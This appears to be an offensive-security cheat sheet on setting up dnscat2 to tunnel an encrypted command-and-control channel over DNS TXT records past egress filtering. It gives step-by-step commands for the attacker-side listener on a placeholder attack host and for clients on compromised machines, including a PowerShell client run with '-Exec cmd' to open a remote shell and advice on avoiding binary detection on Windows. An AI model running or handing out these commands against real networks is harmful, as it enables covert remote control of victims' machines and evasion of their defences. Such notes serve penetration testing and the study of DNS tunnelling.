
1. Detect egress filtering stripping HTTPS or active traffic sniffing while DNS resolution to external/authoritative servers remains functional.
2. Deploy the `dnscat2` server on `<ATTACK_IP>` to listen for TXT record queries.
3. Choose client based on target OS: use the standard C client for performance or the PowerShell-based client to avoid binary execution on Windows.
4. Run the client using the **pre-shared secret** provided by the server to establish an **encrypted and verified** tunnel.
5. Manage established sessions via the server’s window management to drop into a command shell.

---

## Dnscat2 Server Setup

Firewalls perform deep packet inspection or block outbound web traffic while allowing internal DNS servers to resolve external hostnames.

Clone and install server-side dependencies

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Start the listener on the attack host for a specific domain

```
sudo ruby dnscat2.rb --dns host=<ATTACK_IP>,port=53,domain=<DOMAIN> --no-cache
```

> ⚠️ Gap: Technique requires a registered domain with an **NS record** pointing to the `<ATTACK_IP>` for traffic to successfully route through corporate DNS resolvers to the attacker.

- **UDP port 53** must be reachable on the attack host.

## Dnscat2 Client Execution

Establishing an encrypted C2 channel via TXT records from a compromised host where traditional shells are blocked.

Establish tunnel via authoritative DNS resolution

```
./dnscat --secret=<HASH> <DOMAIN>
```

Establish tunnel via direct connection to the attack server

```
./dnscat --dns server=<ATTACK_IP>,port=53 --secret=<HASH>
```

Import and execute PowerShell client on Windows targets to bypass binary detection

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACK_IP> -Domain <DOMAIN> -PreSharedSecret <HASH> -Exec cmd
```

- Standard Client
    - `./dnscat --secret=<HASH> <DOMAIN>`
    - Prefer for performance or non-Windows environments.
- PowerShell Client
    - `Start-Dnscat2 -PreSharedSecret <HASH>`
    - Prefer for Windows targets to **establish a tunnel** without dropping suspicious binaries.

**Incorrect pre-shared secret** results in authentication failure and prevents session encryption.

## Interactive Session Control

Shell interaction is required after the "New window created" notification appears on the server.

List all active sessions managed by the server

```
windows
```

Interact with a specific session ID to enter the console

```
window -i <SESSION_ID>
```

- **No command prompt** may be visible upon entry; run `pwd` to verify the shell is responsive.

**Ctrl-Z** is required to background the current session and return to the `dnscat2` prompt.